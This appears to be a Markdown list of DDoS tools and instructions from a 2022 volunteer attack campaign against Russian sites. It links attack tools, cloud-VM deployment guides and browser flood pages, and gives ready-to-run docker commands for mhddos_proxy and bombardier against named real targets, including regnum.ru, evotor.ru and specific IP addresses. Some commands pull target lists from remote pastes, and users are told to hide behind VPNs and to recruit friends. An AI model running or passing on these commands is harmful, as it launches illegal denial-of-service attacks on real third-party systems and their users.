# Tools for DDoS

## Death by 1000 needles

[Instruction](https://telegra.ph/Death-by-1000-needles-03-17)
[Github](https://github.com/Arriven/db1000n)

> docker run --rm --pull always ghcr.io/arriven/db1000n ./main -c <targets> -debug

## Liberator (from disBalancer)

[Link 1](https://blog.disbalancer.com/liberator-faq-ukra%D1%97nska/)
[Link 2](https://github.com/disbalancer-project/main)

## LOIC - Low Orbit Ion Cannon

???

## KiberBULL

 0. Instructions
    [інструкція для розгортання віртуалок на АМАЗОНІ, завжди перевіряйте баланс!](https://telegra.ph/DDOS-SEPAR-02-26)
    [інструкція для розгортання віртуалок на Digital Ocean, завжди перевіряйте баланс!](https://telegra.ph/Digital-Ocean-02-27)
    [атака з будь-якого пристрою на конкретну ціль](https://www.lookquizru.xyz)
    [атака з будь-якого пристрою на декілька цілей](https://2022pollquizinru.xyz/)
    [Як бути корисним](https://telegra.ph/Korist-03-05)
    [Створення Kubernetes кластера в AWS](https://rentry.co/tvqtm)

 1. Docker - MHDDoS —  без VPN: 

 > sudo docker run -ti --rm alpine/bombardier -c 100 -d 3600s -l https://regnum.ru  

 > sudo docker run -it --rm --pull always portholeascend/mhddos_proxy:latest -c https://pastebin.com/raw/DjWYfRg1 --debug

 > sudo docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -c https://lookquizru.xyz/paste.txt --table
 
 > sudo docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest tcp://178.57.71.182:443 tcp://178.57.71.190:443 tcp://185.31.134.103:443 tcp://185.31.134.104:443 -t 1000 -p 1200 --rpc 1000 --debug

 > docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest https://evotor.ru -t 2000 --rpc 1000 -p 900 --http-methods STRESS --debug

 2. https://www.lookquizru.xyz, https://2022pollquizinru.xyz/ — залучайте друзів до атаки, достатньо просто натиснути СТАРТ; час від часу чистіть кеш Вашого браузеру та користуйтесь VPN/проксі.

## Other

[Grrwahrr](https://github.com/Grrwahrr/avtomat_dos)
[Ban Dera](http://ban-dera.com)
[Runner Go](https://github.com/nanabanano/runner-go/)